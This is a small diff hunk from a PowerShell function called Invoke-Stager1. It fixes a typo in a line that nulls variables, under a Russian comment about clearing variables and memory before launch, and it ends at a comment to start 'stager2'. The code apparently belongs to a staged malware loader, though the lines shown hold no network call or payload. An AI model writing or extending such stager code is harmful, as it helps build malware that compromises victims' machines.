@@ -230,7 +230,7 @@ function Invoke-Stager1 {param($ip, $build, $key)
 	
 	#5. очистка всех переменных и юзаемой памяти перед запуском
 	$sid=$null;$domain=$null;$wlng=$null;$kb_a=$null;$kb=$null;$win=$null;$arch=$null;$path=$null;$file=$null;$i=$null;
-	$S2key=$null;$SKB=$null;$buf=$null;$url=$null;$S2$null;
+	$S2key=$null;$SKB=$null;$buf=$null;$url=$null;$S2=$null;
 	[GC]::Collect();
 	
 	#6. start stager2
